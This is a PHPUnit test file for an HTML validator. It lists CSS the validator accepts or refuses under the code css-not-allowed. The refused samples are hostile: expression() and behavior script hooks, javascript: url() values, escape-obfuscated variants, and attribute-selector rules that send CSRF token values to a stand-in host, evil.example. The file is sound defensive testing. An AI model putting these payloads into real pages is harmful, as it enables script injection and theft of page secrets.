<?php
declare(strict_types=1);

namespace Itools\HtmlValidator\Tests\Unit;

use Itools\HtmlValidator\Tests\Support\HtmlValidatorTestCase;
use PHPUnit\Framework\Attributes\DataProvider;

/**
 * CSS in the style attribute and the <style> element: the constructs that ran script in
 * some browser, backslash escapes that hide them, the schemes url() may use, and the two
 * selectors that let a style sheet leak what is on the page.
 *
 * Code: css-not-allowed.
 */
final class CssTest extends HtmlValidatorTestCase
{
    //region Allowed

    #[DataProvider('allowedCssProvider')]
    public function testAllowedCss(string $css): void
    {
        $this->assertAccepts("<p style=\"$css\">x</p>");
        $this->assertAccepts("<style>p { $css }</style>");
    }

    public static function allowedCssProvider(): array
    {
        return [
            'plain'                 => ['color: red; font-size: 12px'],
            'relative url'          => ['background: url(images/bg.png)'],
            'root url'              => ["background: url('/images/bg.png')"],
            'https url'             => ['background: url("https://cdn.example.com/bg.png")'],
            'http url'              => ['background: url(http://example.com/bg.png)'],
            'protocol relative url' => ['background: url(//cdn.example.com/bg.png)'],
            'fragment url'          => ['clip-path: url(#clip)'],
            'font family quotes'    => ["font-family: 'Open Sans', Arial"],
            'word paste'            => ['mso-bidi-font-weight: normal; tab-stops: 36.0pt'],
            'position fixed'        => ['position: fixed; top: 0; z-index: 9999'],   // a phishing overlay, not script: a known non-goal
            'scroll-behavior'       => ['scroll-behavior: smooth; overscroll-behavior: contain'],
            'empty'                 => [''],
        ];
    }

    public function testStyleElementContentIsCheckedAsCss(): void
    {
        $this->assertAccepts('<style>@media print { p { display: none } } .a::before { content: "<script>" }</style>');
    }

    public function testTextAfterStyleIsNotCss(): void
    {
        $this->assertAccepts('<style>p { color: red }</style><p>expression( is just text here</p>');
    }

    //endregion
    //region Refused

    #[DataProvider('refusedCssProvider')]
    public function testRefusedCss(string $css, string $detail): void
    {
        $violation = $this->assertRejects("<p style=\"$css\">x</p>", 'css-not-allowed', $detail);
        $this->assertSame("CSS containing $detail is not allowed", $violation->message);
        $this->assertRejects("<style>p { $css }</style>", 'css-not-allowed', $detail);
    }

    public static function refusedCssProvider(): array
    {
        return [
            'expression'            => ['width: expression(alert(1))', 'expression('],
            'expression uppercase'  => ['width: EXPRESSION(alert(1))', 'EXPRESSION('],
            'behavior'              => ['behavior: url(x.htc)', 'behavior:'],
            'behavior with space'   => ['behavior : url(x.htc)', 'behavior :'],
            'behavior star hack'    => ['*behavior: url(x.htc)', 'behavior:'],   // IE7 read *behavior as behavior
            'behavior underscore'   => ['_behavior: url(x.htc)', 'behavior:'],   // and IE6 read _behavior
            'moz-binding'           => ['-moz-binding: url(x.xml#a)', '-moz-binding'],
            'import'                => ['@import url(https://example.com/x.css)', '@import'],
            'charset'               => ['@charset "UTF-7"', '@charset'],
            'backslash escape'      => ['width: e\\78 pression(alert(1))', '\\'],
            'image function'        => ['background: image(x.png)', 'image('],
            'image-set function'    => ['background: image-set(x.png 1x)', 'image-set('],
            'src function'          => ['background: src(x.png)', 'src('],
            'javascript url'        => ['background: url(javascript:x)', 'url(javascript:x)'],
            'javascript url quoted' => ["background: url('javascript:x')", 'url(javascript:x)'],
            'javascript url spaced' => ['background: url( javascript:x )', 'url(javascript:x)'],
            'url with parens'       => ['background: url(javascript:alert(1))', 'url(javascript:alert(1)'],   // an unquoted url() ends at the first ), as in CSS
            'data url'              => ['background: url(data:image/svg+xml,<svg/>)', 'url(data:image/svg+xml,<svg/>)'],
            'vbscript url'          => ['background: url(vbscript:x)', 'url(vbscript:x)'],
            'unknown scheme url'    => ['background: url(ftp://example.com/x.png)', 'url(ftp://example.com/x.png)'],
            'mailto url'            => ['background: url(mailto:a@b.c)', 'url(mailto:a@b.c)'],
            'url uppercase'         => ['background: URL(JAVASCRIPT:x)', 'url(JAVASCRIPT:x)'],
        ];
    }

    public function testEntitiesInStyleAttributeDecodeBeforeTheCheck(): void
    {
        $this->assertRejects('<p style="width: expression&#40;alert(1))">x</p>', 'css-not-allowed', 'expression(');
    }

    public function testStyleElementContentIsNotEntityDecoded(): void
    {
        $this->assertAccepts('<style>p::before { content: "expression&#40;" }</style>');   // raw text to a browser, so the entity stays
    }

    //endregion
    //region Comments and Strings

    /**
     * A comment or a quoted string cannot spell a property, a function or a selector, so a
     * backslash inside one is a character, not an escape to check. Email templates draw comment
     * banners with backslashes and Word pastes quote font names like "\@Yu Mincho".
     */
    #[DataProvider('commentAndStringProvider')]
    public function testBackslashesInCommentsAndStringsPass(string $css): void
    {
        $this->assertAccepts("<p style=\"$css\">x</p>");
        $this->assertAccepts("<style>p { $css }</style>");
    }

    public static function commentAndStringProvider(): array
    {
        return [
            'comment banner'     => ['/* \\/\\/\\/ CLIENT STYLES \\/\\/\\/ */ color: red'],
            'path in a comment'  => ['/* C:\\Users\\shared\\brand.css */ color: red'],
            'unclosed comment'   => ['color: red /* runs to the end \\'],
            'escape in a string' => ["content: '\\a0 \\b7 '"],
            'word font name'     => ["font-family: '\\@Yu Mincho', serif"],
            'escaped quote'      => ["content: 'it\\'s'"],
        ];
    }

    /** Blanking stops exactly where the browser's CSS tokenizer does, so nothing outside a comment or string is hidden */
    #[DataProvider('escapeOutsideCommentOrStringProvider')]
    public function testEscapesOutsideCommentsAndStringsAreRefused(string $css, string $detail): void
    {
        $this->assertRejects("<p style=\"$css\">x</p>", 'css-not-allowed', $detail);
        $this->assertRejects("<style>p { $css }</style>", 'css-not-allowed', $detail);
    }

    public static function escapeOutsideCommentOrStringProvider(): array
    {
        return [
            'after a comment'           => ['/* x */ width: e\\78 pression(1)', '\\'],
            'after a string'            => ["content: 'x'; width: e\\78 pression(1)", '\\'],
            'comment start in a string' => ["content: '/*'; width: e\\78 pression(1) /* */", '\\'],   // the quote comes first, so /* is text and the escape is live
            'newline ends a string'     => ["content: 'x\n; width: e\\78 pression(1)", '\\'],           // a bare newline ends a CSS string, so the escape is live
            'escape in a quoted url'    => ["background: url('\\6a avascript:x')", "url('\\"],         // a string escape still spells a scheme here
            'escape in a bare url'      => ['background: url(\\6a avascript:x)', '\\'],
        ];
    }

    /**
     * A block past the PCRE limits is still checked: blanking gives up and the text is checked as
     * written, which is stricter, and no pattern backtracks across the block, since preg_match()
     * returns false past the limit and a false would let the whole block through.
     */
    public function testMegabyteBlocksAreStillChecked(): void
    {
        $stars = str_repeat('* ', 1024 * 1024);
        $this->assertAccepts("<style>/* $stars */ p { color: red }</style>");
        $escapes = str_repeat('\\a', 1024 * 1024 + 512 * 1024);
        $this->assertRejects("<style>p { content: '$escapes'; width: expression(1) }</style>", 'css-not-allowed');
        $padding = str_repeat('a', 1024 * 1024 + 512 * 1024);
        $this->assertRejects("<style>[$padding width: expression(1)</style>", 'css-not-allowed', 'expression(');   // a [ with no ]= after it
        $this->assertRejects("<p style=\"[$padding width: expression(1)\">x</p>", 'css-not-allowed', 'expression(');
    }

    //endregion
    //region Page Data Leaks

    /**
     * A selector that matches on page data plus a url() to another host sends that data there:
     * [value^="a"] tests an input's value one character at a time, and @font-face unicode-range
     * loads the font only when a character is on the page.
     */
    #[DataProvider('leakProvider')]
    public function testSelectorsThatLeakPageDataAreRefused(string $css, string $detail): void
    {
        $this->assertRejects("<style>$css</style>", 'css-not-allowed', $detail);
    }

    public static function leakProvider(): array
    {
        return [
            'starts with'            => ['input[name=csrf][value^="a"] { background: url(//evil.example/?a) }', '[value^='],
            'ends with'              => ['input[value$="a"] { background: url(//evil.example/?a) }', '[value$='],
            'contains'               => ['a[href*="token="] { background: url(//evil.example/?a) }', '[href*='],
            'spaces around'          => ['input[ value ^= "a" ] { color: red }', '[ value ^='],
            'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value ^='],   // comments are blanked before the check, so the quote shows a space in its place
            'uppercase'              => ['INPUT[VALUE^="a"] { color: red }', '[VALUE^='],
            'namespace wildcard'     => ['input[*|value^="a"] { background: url(//evil.example/?a) }', '[*|value^='],   // *| means any namespace, including none, so browsers read it as [value^=
            'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
            'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
            'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
        ];
    }

    #[DataProvider('harmlessSelectorProvider')]
    public function testOtherSelectorsPass(string $css): void
    {
        $this->assertAccepts("<style>$css</style>");
    }

    public static function harmlessSelectorProvider(): array
    {
        return [
            'exact match'            => ['input[type=text] { border: 1px solid #ccc }'],
            'exact match quoted'     => ['a[href="https://example.com/"] { color: red }'],
            'word match'             => ['[class~="x_body"] { margin: 0 }'],
            'dash match'             => ['[lang|="en"] { quotes: none }'],
            'presence'               => ['input[disabled] { opacity: .5 }'],
            'font-face without range' => ['@font-face { font-family: f; src: url(https://fonts.example/f.woff2) }'],
            'attribute selector then url' => ['input[type=text] { background: url(https://cdn.example/bg.png) }'],
        ];
    }

    //endregion
}
